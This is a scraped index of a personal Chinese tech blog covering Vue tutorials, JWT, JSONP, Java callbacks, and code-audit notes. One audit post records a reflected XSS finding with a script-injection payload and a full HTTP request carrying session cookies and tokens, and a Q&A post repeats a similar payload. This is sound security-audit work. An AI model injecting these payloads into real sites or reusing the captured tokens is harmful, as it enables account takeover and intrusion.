4.语法父组件 12345678//.sync写法&lt;BaseDialog :visible.sync=&quot;isShow&quot; /&gt;--------------------------------------//完整写法&lt;BaseDialog :visible=&quot;isShow&quot; @update:visible=&quot;isShow = $event&quot; /&gt; 子组件 12345props: &#123; visible: Boolean&#125;,this.$emit(&#x27;update:visible&#x27;, false) 5.代码示例App.vue 123456789101112131415161718192021222324252627282930&lt;template&gt; &lt;div class=&quot;app&quot;&gt; &lt;button @click=&quot;openDialog&quot;&gt;退出按钮&lt;/button&gt; &lt;!-- isShow.sync =&gt; :isShow=&quot;isShow&quot; @update:isShow=&quot;isShow=$event&quot; --&gt; &lt;BaseDialog :isShow.sync=&quot;isShow&quot;&gt;&lt;/BaseDialog&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import BaseDialog from &#x27;./components/BaseDialog.vue&#x27;export default &#123; data() &#123; return &#123; isShow: false, &#125; &#125;, methods: &#123; openDialog() &#123; this.isShow = true // console.log(document.querySelectorAll(&#x27;.box&#x27;)); &#125;, &#125;, components: &#123; BaseDialog, &#125;,&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; BaseDialog.vue 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;template&gt; &lt;div class=&quot;base-dialog-wrap&quot; v-show=&quot;isShow&quot;&gt; &lt;div class=&quot;base-dialog&quot;&gt; &lt;div class=&quot;title&quot;&gt; &lt;h3&gt;温馨提示：&lt;/h3&gt; &lt;button class=&quot;close&quot; @click=&quot;closeDialog&quot;&gt;x&lt;/button&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;p&gt;你确认要退出本系统么？&lt;/p&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;button&gt;确认&lt;/button&gt; &lt;button&gt;取消&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; props: &#123; isShow: Boolean, &#125;, methods:&#123; closeDialog()&#123; this.$emit(&#x27;update:isShow&#x27;,false) &#125; &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;.base-dialog-wrap &#123; width: 300px; height: 200px; box-shadow: 2px 2px 2px 2px #ccc; position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); padding: 0 10px;&#125;.base-dialog .title &#123; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #000;&#125;.base-dialog .content &#123; margin-top: 38px;&#125;.base-dialog .title .close &#123; width: 20px; height: 20px; cursor: pointer; line-height: 10px;&#125;.footer &#123; display: flex; justify-content: flex-end; margin-top: 26px;&#125;.footer button &#123; width: 80px; height: 40px;&#125;.footer button:nth-child(1) &#123; margin-right: 10px; cursor: pointer;&#125;&lt;/style&gt; 6.总结1.父组件如果想让子组件修改传过去的值 必须加什么修饰符？ &lt;BaseDialog :isShow.sync=&quot;isShow&quot;&gt;&lt;/BaseDialog&gt; 2.子组件要修改父组件的props值 必须使用什么语法？ this.$emit(&#39;update:isShow&#39;,false) ref和$refs1.作用利用ref 和 $refs 可以用于 获取 dom 元素 或 组件实例 2.特点查找范围 → 当前组件内(更精确稳定) 3.语法1.给要获取的盒子添加ref属性 1&lt;div ref=&quot;chartRef&quot;&gt;我是渲染图表的容器&lt;/div&gt; 2.获取时通过 $refs获取 this.$refs.chartRef 获取 123mounted () &#123; console.log(this.$refs.chartRef)&#125; 4.注意之前只用document.querySelect(‘.box’) 获取的是整个页面中的盒子 5.代码示例App.vue 1234567891011121314151617&lt;template&gt; &lt;div class=&quot;app&quot;&gt; &lt;BaseChart&gt;&lt;/BaseChart&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import BaseChart from &#x27;./components/BaseChart.vue&#x27;export default &#123; components:&#123; BaseChart &#125;&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 获取dom元素BaseChart.vue 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;template&gt; &lt;div class=&quot;base-chart-box&quot; ref=&quot;baseChartBox&quot;&gt;子组件&lt;/div&gt;&lt;/template&gt;&lt;script&gt;// yarn add echarts 或者 npm i echartsimport * as echarts from &#x27;echarts&#x27;export default &#123; mounted() &#123; // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.querySelect(&#x27;.base-chart-box&#x27;)) // 绘制图表 myChart.setOption(&#123; title: &#123; text: &#x27;ECharts 入门示例&#x27;, &#125;, tooltip: &#123;&#125;, xAxis: &#123; data: [&#x27;衬衫&#x27;, &#x27;羊毛衫&#x27;, &#x27;雪纺衫&#x27;, &#x27;裤子&#x27;, &#x27;高跟鞋&#x27;, &#x27;袜子&#x27;], &#125;, yAxis: &#123;&#125;, series: [ &#123; name: &#x27;销量&#x27;, type: &#x27;bar&#x27;, data: [5, 20, 36, 10, 10, 20], &#125;, ], &#125;) &#125;,&#125;&lt;/script&gt;&lt;style scoped&gt;.base-chart-box &#123; width: 400px; height: 300px; border: 3px solid #000; border-radius: 6px;&#125;&lt;/style&gt; 获取组件实例1234567891011121314151617181920212223242526272829303132333435363738394041&lt;template&gt; &lt;div class=&quot;app&quot;&gt; &lt;div v-if=&quot;isShowEdit&quot;&gt; //通过ref=&quot;&quot;的方式对组件进行标识 &lt;input type=&quot;text&quot; v-model=&quot;editValue&quot; ref=&quot;inp&quot; /&gt; &lt;button&gt;确认&lt;/button&gt; &lt;/div&gt; &lt;div v-else&gt; &lt;span&gt;&#123;&#123; title &#125;&#125;&lt;/span&gt; &lt;button @click=&quot;editFn&quot;&gt;编辑&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; title: &#x27;大标题&#x27;, isShowEdit: false, editValue: &#x27;&#x27;, &#125; &#125;, methods: &#123; editFn() &#123; // 1.显示文本框 this.isShowEdit = true // 2.让文本框聚焦 （会等dom更新完之后 立马执行nextTick中的回调函数） // this.$nextTick(() =&gt; &#123; // console.log(this.$refs.inp) // this.$refs.inp.focus() // &#125;) setTimeout(() =&gt; &#123; //通过this.$refs.inf调用组件实例。 this.$refs.inp.focus() &#125;, 0) &#125;, &#125;,&#125;&lt;/script&gt; 异步更新 &amp; $nextTick1.需求编辑标题, 编辑框自动聚焦 点击编辑，显示编辑框 让编辑框，立刻获取焦点 2.代码实现12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class=&quot;app&quot;&gt; &lt;div v-if=&quot;isShowEdit&quot;&gt; &lt;input type=&quot;text&quot; v-model=&quot;editValue&quot; ref=&quot;inp&quot; /&gt; &lt;button&gt;确认&lt;/button&gt; &lt;/div&gt; &lt;div v-else&gt; &lt;span&gt;&#123;&#123; title &#125;&#125;&lt;/span&gt; &lt;button @click=&quot;editFn&quot;&gt;编辑&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; title: &#x27;大标题&#x27;, isShowEdit: false, editValue: &#x27;&#x27;, &#125; &#125;, methods: &#123; editFn() &#123; // 显示输入框 this.isShowEdit = true // 获取焦点 this.$refs.inp.focus() &#125; &#125;,&#125;&lt;/script&gt; 3.问题“显示之后”，立刻获取焦点是不能成功的！ 原因：Vue 是异步更新DOM (提升性能) 4.解决方案$nextTick：等 DOM更新后,才会触发执行此方法里的函数体 语法: this.$nextTick(函数体) 123this.$nextTick(() =&gt; &#123; this.$refs.inp.focus()&#125;) 注意：$nextTick 内的函数体 一定是箭头函数，这样才能让函数内部的this指向Vue实例 自定义指令1.指令介绍 内置指令：v-html、v-if、v-bind、v-on… 这都是Vue给咱们内置的一些指令，可以直接使用 自定义指令：同时Vue也支持让开发者，自己注册一些指令。这些指令被称为自定义指令 每个指令都有自己各自独立的功能 2.自定义指令概念：自己定义的指令，可以封装一些DOM操作，扩展额外的功能 3.自定义指令语法 全局注册 1234567//在main.js中Vue.directive(&#x27;指令名&#x27;, &#123; &quot;inserted&quot; (el) &#123; // 可以对 el 标签，扩展额外功能 el.focus() &#125;&#125;) 局部注册 123456789101112131415export default &#123; // mounted () &#123; // this.$refs.inp.focus() // &#125; // 2. 局部注册指令 directives: &#123; // 指令名：指令的配置项 focus: &#123; inserted (el) &#123; el.focus() &#125; &#125; &#125;&#125; 使用指令 注意：在使用指令的时候，一定要先注册，再使用，否则会报错使用指令语法： v-指令名。如：&lt;input type=&quot;text&quot; v-focus/&gt; 注册指令时不用加v-前缀，但使用时一定要加v-前缀 4.指令中的配置项介绍inserted:被绑定元素插入父节点时调用的钩子函数 el：使用指令的那个DOM元素 5.代码示例需求：当页面加载时，让元素获取焦点（autofocus在safari浏览器有兼容性） App.vue 1234&lt;div&gt; &lt;h1&gt;自定义指令&lt;/h1&gt; &lt;input v-focus ref=&quot;inp&quot; type=&quot;text&quot;&gt;&lt;/div&gt; 6.总结1.自定义指令的作用是什么？ 封装DOM操作，扩展额外的功能； 2.使用自定义指令的步骤是哪两步？ 第一步，通过全局(main.js)、局部(组件的vue)进行自定义指令的注册；第二步，通过v-xxx指令在DOM中进行使用。","categories":[{"name":"前端","slug":"前端","permalink":"https://erickinyae.github.io/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"框架","slug":"框架","permalink":"https://erickinyae.github.io/tags/%E6%A1%86%E6%9E%B6/"}]},{"title":"前端基础","slug":"前端基础","date":"2023-12-20T06:40:01.000Z","updated":"2023-12-30T15:54:42.897Z","comments":true,"path":"2023/12/20/前端基础/","permalink":"https://erickinyae.github.io/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/","excerpt":"","text":"前端基础依赖存放位置项目的依赖等信息都放在前端根目录下的：package.json文件中； 依赖下载在根目录中，在终端执行npm install，即可将依赖拉下来。 项目启动命令在package.json中查看 12345678910&quot;scripts&quot;: &#123; &quot;dev&quot;: &quot;vue-cli-service serve&quot;, &quot;build:prod&quot;: &quot;vue-cli-service build&quot;, &quot;build:stage&quot;: &quot;vue-cli-service build --mode staging&quot;, &quot;preview&quot;: &quot;node build/index.js --preview&quot;, &quot;svgo&quot;: &quot;svgo -f src/icons/svg --config=src/icons/svgo.yml&quot;, &quot;lint&quot;: &quot;eslint --ext .js,.vue src&quot;, &quot;test:unit&quot;: &quot;jest --clearCache &amp;&amp; vue-cli-service test:unit&quot;, &quot;test:ci&quot;: &quot;npm run lint &amp;&amp; npm run test:unit&quot;&#125;, 看到第一行，dev关键词对应了vue-cli-service serve，即可以通过 dev start 启动前端项目。 1npm run dev 目录结构 解决跨域问题","categories":[{"name":"前端","slug":"前端","permalink":"https://erickinyae.github.io/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[]},{"title":"代码审计方法论","slug":"代码审计方法论","date":"2023-12-08T08:10:22.000Z","updated":"2023-12-08T08:10:50.180Z","comments":true,"path":"2023/12/08/代码审计方法论/","permalink":"https://erickinyae.github.io/2023/12/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/","excerpt":"","text":"黑盒验证 -&gt; 白盒代码级确认 -&gt; 代码修复建议 第一步 目标确认、理解功能与架构 确定要审计的应用程序或系统的范围，包括具体的功能、模块或代码库。具体而言，需要收集与应用程序相关的所有文档，包括设计文档、架构文档、数据库模型等。同时收集应用程序的源代码、依赖项和配置文件； 通过收集到的信息清晰地理解到应用中具体的一些功能和所使用的架构信息，并在此基础上，标记出容易出现漏洞的部分（如写库操作、高级权限操作等）； 第二步 动态黑盒分析 配置测试环境：配置一个用于动态测试的安全环境，确保能够模拟真实攻击场景； 自动扫描：使用动态代码分析工具，包括：xray、Burp Suite等，对应用程序进行主动扫描，寻找运行时漏洞，这个部分主要是为了发现常见的OWASP Top10基本漏洞； 主动测试：通过手动渗透测试，模拟攻击者行为，尝试绕过安全控制并发现更深层次的漏洞； 主要针对的有： 身份验证绕过：缺失对用户身份验证的检查或绕过密码验证； 访问控制：缺失访问控制检查，导致未授权用户或角色访问敏感数据或功能； 会话管理：错误的会话处理，包括会话劫持、会话固定、未正确终止会话等，可能会导致未授权访问； 数据验证不足：对输入数据进行不足的验证，可能导致注入攻击、越权访问等问题； 业务逻辑：与应用程序的业务逻辑相关的错误，可能导致不正确的数据处理或操作； 不正确的错误处理：错误处理机制不当，可能会泄露敏感信息，或为攻击者提供有关系统的信息； 文件上传：不正确地处理用户上传的文件，可能导致恶意文件上传和执行； 多步骤操作原子性问题：缺乏适当的事务处理，导致在多步骤操作中的某些步骤失败时，系统处于不一致状态； 竞态条件：在多线程或并发操作时，由于时序不当而引发的问题，可能导致未授权访问或数据不一致； 缺乏日志监控：缺乏对关键事件和日常的日志记录和监控，使得对安全事件的检测和响应受到影响。 第三步 白盒分析 代码分析：仔细阅读源代码，理解应用程序的工作原理、数据流和业务逻辑； 使用静态代码分析工具，尝试找到代码中存在的问题，黑盒测试找到的漏洞，需要在白盒中进行定位并找到修复方法，确定是方法使用不当、还是鉴权逻辑错误、还是第三方包漏洞等； 主要针对的有： 数据验证：验证应用程序对输入数据的处理方式，确保实施了正确的输入验证和过滤，以防止注入攻击； 认证和授权：审查应用程序中的身份验证和授权机制，确认它们是否安全可靠。检查密码存储、会话管理和访问控制； 敏感信息：检查应用程序处理敏感信息的方式，确保数据在传输和存储时都得到适当的加密和保护（密码）； 异常处理：审查应用程序的异常处理机制和日志记录功能，确保它们不会泄漏敏感信息（SQL报错不要直接返回等），并能够帮助检测和响应安全事件；","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计-漏洞记录","slug":"代码审计-漏洞记录","date":"2023-12-06T05:56:28.000Z","updated":"2023-12-08T08:25:17.128Z","comments":true,"path":"2023/12/06/代码审计-漏洞记录/","permalink":"https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/","excerpt":"","text":"XSS URL http://localhost:8888/system/cms/content/page?categoryId= ParamPosition body ParamKey title Payload &quot;&gt;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt; Request1 POST /system/cms/content/page?categoryId= HTTP/1.1 Host: localhost:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 118 Accept: text/html, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: vue_admin_template_token=admin-token; sidebarStatus=1; remember-me=YWRtaW46MTcwMjg4MzgxNDczNjo5ZjkwYmVhZTJhYjZiNjQyMzdhODNkZDhkMTRjNDJjZA; XSRF-TOKEN=7846bad7-ebe4-48a8-8cfb-3d72a7ab1564; cms_token=226553f96fb74a328f9798f1424850fe; dreamer-cms-s=c1544459-e4a0-4ea3-99c5-0ddebf2cae66; pb-cms-qq=; pb-cms-email=956968575@qq.com; JSESSIONID=F5F5CB00146F24022BB0EDA921A43D40; pageno_cookie=1; SHIRO_SESSION_ID=69dc1ad1-a73c-458c-87a0-531cf132c0f1; SESSION=ef82c6e0-dade-404a-8183-85c3b67dc7c7; bjui_theme=blue; Idea-fa2b9155=227d5999-324b-42f9-af39-22bf2f71aa49 Origin: http://localhost:8888 Referer: http://localhost:8888/system Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-Requested-With: XMLHttpRequest Accept-Encoding: gzip orderDirection=&amp;orderField=&amp;pageCurrent=1&amp;pageSize=30&amp;status=&amp;title=%22%3E%3CsCrIpT%3Eywrwavrxad%3C%2FsCrIpT%3E&amp;total=Copy Response1 &#96;HTTP&#x2F;1.1 200 Content-Language: zh-CN Content-Type: text&#x2F;html;charset&#x3D;UTF-8 Date: Wed, 06 Dec 2023 02:58:02 GMT 状态: 所有 删除 草稿 发布 标题：ywrwavrxad“ name&#x3D;”title” class&#x3D;”form-control” size&#x3D;”15”&gt; 查询 刷新全部 &lt;!–&lt;button type&#x3D;”button” class&#x3D;”btn-blue” data-url&#x3D;”ajaxDone2.html?id&#x3D;","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"QandA","slug":"QandA","date":"2023-12-06T02:52:13.000Z","updated":"2023-12-30T15:55:26.920Z","comments":true,"path":"2023/12/06/QandA/","permalink":"https://erickinyae.github.io/2023/12/06/QandA/","excerpt":"","text":"&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; xss注入疑问通过xray扫到了xss注入漏洞，并按照报告注入了相应的负载，但响应中并没有正确执行js脚本。 项目地址： http://localhost:8888/admin/login -&gt; 内容管理 -&gt; 查询 1orderDirection=&amp;orderField=&quot;&gt;&lt;ScRiPt&gt;alert(&quot;123123123&quot;)&lt;/sCrIpT&gt;&amp;pageCurrent=1&amp;pageSize=50&amp;total=","categories":[{"name":"其他","slug":"其他","permalink":"https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[]},{"title":"代码审计_逻辑漏洞","slug":"代码审计-逻辑漏洞","date":"2023-12-05T08:08:23.000Z","updated":"2023-12-05T08:08:40.253Z","comments":true,"path":"2023/12/05/代码审计-逻辑漏洞/","permalink":"https://erickinyae.github.io/2023/12/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"审计","slug":"审计","permalink":"https://erickinyae.github.io/tags/%E5%AE%A1%E8%AE%A1/"}]},{"title":"OWASP代码审计指南","slug":"OWASP代码审计指南","date":"2023-11-30T07:53:45.000Z","updated":"2023-12-30T15:55:18.166Z","comments":true,"path":"2023/11/30/OWASP代码审计指南/","permalink":"https://erickinyae.github.io/2023/11/30/OWASP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/","excerpt":"","text":"","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"词汇扫盲","slug":"词汇扫盲","date":"2023-11-30T07:24:20.000Z","updated":"2023-12-01T02:07:49.458Z","comments":true,"path":"2023/11/30/词汇扫盲/","permalink":"https://erickinyae.github.io/2023/11/30/%E8%AF%8D%E6%B1%87%E6%89%AB%E7%9B%B2/","excerpt":"","text":"SDLCSDLC代表软件开发生命周期（Software Development Life Cycle）。它是一种用于设计、开发、测试和维护软件系统的过程或一组过程。SDLC的目的是产生符合或超出客户期望的高质量软件，在预定的时间和成本估算内完成，并在当前和计划的信息技术基础设施中有效且高效地运行。 SDLC的典型阶段包括： 规划： 在这个阶段，定义项目目标、范围、约束、风险和资源。创建项目计划，概述时间表、任务和责任。 可行性研究： 进行可行性研究，评估所提系统的技术、运营和经济可行性。这有助于决定是否继续开发。 系统设计： 系统设计阶段涉及为软件系统创建蓝图。包括高层和低层设计，定义架构、数据结构、接口和其他系统组件。 实施（编码）： 这是实际编写软件代码的阶段。开发人员按照设计规范创建软件产品。 测试： 对软件进行测试，以确保其满足指定的要求。测试可以包括单元测试、集成测试、系统测试和验收测试。 部署（实施）： 将软件部署到生产环境。这可能涉及数据迁移、用户培训以及其他活动，使软件准备好投入使用。 维护和支持： 部署后，软件进入维护阶段。这包括修复任何缺陷、进行增强和提供持续支持。 评估： 这个阶段涉及在实际环境中评估软件的性能。收集用户和其他利益相关方的反馈，以确定改进的领域。 这些阶段可以根据特定的开发方法进行调整或迭代。常见的开发方法包括瀑布模型、敏捷开发、Scrum等。每种方法都有自己的组织和执行SDLC阶段的方式。 CICDCICD（Continuous Integration and Continuous Delivery）是一种软件开发实践，旨在通过自动化软件发布过程，实现更频繁、更可靠的软件交付。这个流程主要分为两个主要部分：持续集成（Continuous Integration，CI）和持续交付（Continuous Delivery，CD）。 持续集成（CI）: 代码提交： 开发者将代码提交到版本控制系统（如Git）中。 自动化构建： 持续集成服务器会监测版本控制系统，一旦发现有新的代码提交，就会自动拉取代码并进行构建。构建过程包括编译代码、运行单元测试等。 单元测试： 在构建过程中运行自动化的单元测试，以确保新的代码没有破坏现有功能。 报告生成： 生成测试报告，显示测试的覆盖率和结果。 持续交付（CD）: 自动化部署： 如果代码通过了持续集成阶段，它可以自动部署到一个预生产环境。这个环境模拟生产环境，但不对真实用户提供服务。 集成测试： 在预产环境中运行更全面的集成测试，以确保不同组件之间的协作正常。 用户验收测试（UAT）： 有时候，会将应用部署到一个模拟真实用户环境的用户验收测试环境。 自动化发布： 如果所有测试通过，代码可以自动发布到生产环境，使新功能、改进或修复可用于真实用户。 这种流程的实施通常涉及使用各种工具和技术，如持续集成服务器（例如Jenkins、Travis CI）、自动化测试工具、容器化技术（例如Docker）、配置管理工具（例如Ansible）等。","categories":[{"name":"其他","slug":"其他","permalink":"https://erickinyae.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://erickinyae.github.io/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"CodeQL","slug":"CodeQL","date":"2023-11-29T09:19:39.000Z","updated":"2023-12-30T15:54:57.753Z","comments":true,"path":"2023/11/29/CodeQL/","permalink":"https://erickinyae.github.io/2023/11/29/CodeQL/","excerpt":"","text":"","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"身份验证","slug":"身份验证","date":"2023-11-23T07:42:58.000Z","updated":"2023-11-30T01:54:23.346Z","comments":true,"path":"2023/11/23/身份验证/","permalink":"https://erickinyae.github.io/2023/11/23/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/","excerpt":"","text":"JWTJWT（JSON Web Token）是一种用于在网络上安全地将声明传输的开放标准（RFC 7519）。它通常用于在身份验证和信息交换方面进行跨域通信。JWT 是一个紧凑的、自包含的方式，它可以在不同系统之间安全地传递信息。JWT 使用 JSON 对象进行编码，这使得它易于理解和处理。 JWT 由三部分组成： Header（头部）： 包含了两部分信息，类型（typ）和使用的签名算法（alg）。通常，这部分会被 Base64 编码。 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; Payload（负载）： 包含声明（claims）。声明是关于实体（通常是用户）和其他数据的声明。有三种类型的声明：注册声明，公共声明，和私有声明。通常，这部分也会被 Base64 编码。 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true&#125; Signature（签名）： 将前两部分编码后的字符串通过指定的算法进行签名。签名用于验证消息在传递过程中是否被篡改。 12345HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) JWT 的主要优势包括： 轻量且紧凑： JWT 是一种轻量级的令牌格式，适用于在网络上传输信息。 自包含： 由于包含了头部和负载，JWT 是一个自包含的令牌，不需要像传统的 Session 一样在服务器端保存状态。 可扩展： 负载中的声明可以自由扩展，以满足各种应用场景的需求。 跨语言支持： JWT 可以在不同的编程语言中轻松解析和生成，使其成为跨语言通信的良好选择。 JWT 主要用于身份验证（Authentication）和授权（Authorization）场景，特别是在分布式系统和前后端分离的应用中广泛使用。 应用举例用户登录： 用户提供用户名和密码进行登录。 服务器验证用户的凭据，并生成一个 JWT 作为响应。 JWT 的生成过程： Header 部分： 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; Payload 部分： 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;username&quot;: &quot;john_doe&quot;, &quot;role&quot;: &quot;user&quot;&#125; Signature 部分： 使用服务器端的密钥对前两部分进行签名。 生成的 JWT： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJ1c2VybmFtZSI6ICJqb2huX2RvZSIsICJyb2xlIjogInVzZXIiLCAiaWF0IjogMTYxNzYwMjE4NCwiZXhwIjogMTYxNzYwMjM2NH0.NQSmS9BoD8OCMqkdSb0nLd6YBZnd7zLcXtFjIaAOt1k JWT 的传递： 客户端将 JWT 存储在本地，通常是在浏览器的 Local Storage 或 Session Storage 中。 每次客户端向服务器发送请求时，都将 JWT 放在请求头中（通常是 Authorization 头）。 1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJ1c2VybmFtZSI6ICJqb2huX2RvZSIsICJyb2xlIjogInVzZXIiLCAiaWF0IjogMTYxNzYwMjE4NCwiZXhwIjogMTYxNzYwMjM2NH0.NQSmS9BoD8OCMqkdSb0nLd6YBZnd7zLcXtFjIaAOt1k 服务器端验证和解析 JWT： 服务器在接收到请求时，从请求头中获取 JWT。 服务器使用自己的密钥验证 JWT 的签名，确保它是有效的且未被篡改。 如果验证通过，服务器解析 JWT，提取其中的用户信息（例如用户ID、用户名、角色等）。 这种方式使得在分布式系统中进行身份验证变得简单，因为服务器无需在会话中保持用户的登录状态，而是可以通过验证 JWT 来获取用户信息。这也使得不同服务之间更容易实现无状态的身份验证。需要注意的是，JWT 中包含的信息是可以被客户端解码的，因此不应该将敏感信息直接存放在 JWT 中，或者至少需要采用适当的加密手段。","categories":[{"name":"网络","slug":"网络","permalink":"https://erickinyae.github.io/categories/%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"鉴权","slug":"鉴权","permalink":"https://erickinyae.github.io/tags/%E9%89%B4%E6%9D%83/"}]},{"title":"java","slug":"java","date":"2023-11-23T03:33:00.000Z","updated":"2023-12-19T07:56:47.791Z","comments":true,"path":"2023/11/23/java/","permalink":"https://erickinyae.github.io/2023/11/23/java/","excerpt":"","text":"回调函数回调函数（Callback Function）是一种作为参数传递给其他函数的函数。回调函数允许一个函数在另一个函数执行完毕或在特定事件发生时被调用。 从事件驱动的角度理解。 在Java中，回调函数通常通过接口或匿名类的方式实现。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 定义回调接口interface Callback &#123; void onComplete(String result);&#125;// 模拟异步操作的类// AsyncOperation 类模拟了一个异步操作，它接受一个回调接口 Callback 作为参数。在异步操作完成后，通过调用回调函数的 onComplete 方法来通知调用者。class AsyncOperation &#123; void startAsyncOperation(Callback callback) &#123; // 模拟异步操作 new Thread(() -&gt; &#123; try &#123; // 模拟耗时操作 Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 异步操作完成后调用回调函数 String result = &quot;Async operation result&quot;; callback.onComplete(result); &#125;).start(); &#125;&#125;//在 CallbackExample 类的 main 方法中，我们创建了一个 AsyncOperation 对象，并通过传递匿名类的方式实现了回调函数。当异步操作完成时，回调函数会被调用，并输出相应的结果。public class CallbackExample &#123; public static void main(String[] args) &#123; AsyncOperation asyncOperation = new AsyncOperation(); // 启动异步操作，并传递回调函数 asyncOperation.startAsyncOperation(new Callback() &#123; @Override public void onComplete(String result) &#123; // 异步操作完成后的处理逻辑 System.out.println(&quot;Callback received: &quot; + result); &#125; &#125;); // 主线程继续执行其他操作 System.out.println(&quot;Main thread continues to execute...&quot;); &#125;&#125;//这种方式允许在异步操作完成后执行特定的逻辑，使得程序在等待异步结果的同时可以继续执行其他操作。 JSONPJSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 &lt;script&gt; 标签的方式来绕过这一限制，从而实现跨域数据传输。 浏览器同源策略就是，A⽹站只能访问A⽹站数据，B⽹站只能访问B⽹站数据，AB不能互相访问数据。JSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 &lt;script&gt; 标签的方式来绕过这一限制，从而实现跨域数据传输。 理解：注意，这里的跨域是指，当前访问a域名（a.domain.com）加载得到的前端页面，在a域名的前端页面中访问b域名（b.domain.com）的数据，故称之为跨域。 JSONP工作原理： 客户端（浏览器）在页面中动态创建一个 &lt;script&gt; 标签，并设置其 src 属性指向包含 JSON 数据的资源，同时通过查询字符串或路径参数将回调函数名传递给服务器。 123456789// 回调函数function handleData(data) &#123; console.log(&quot;Received data:&quot;, data);&#125;// script代码，在其中指明需要由a域名访问到的b域名资源地址var script = document.createElement(&quot;script&quot;);script.src = &quot;https://example-api.com/data?callback=handleData&quot;;document.body.appendChild(script); 服务器根据接收到的回调函数名，将 JSON 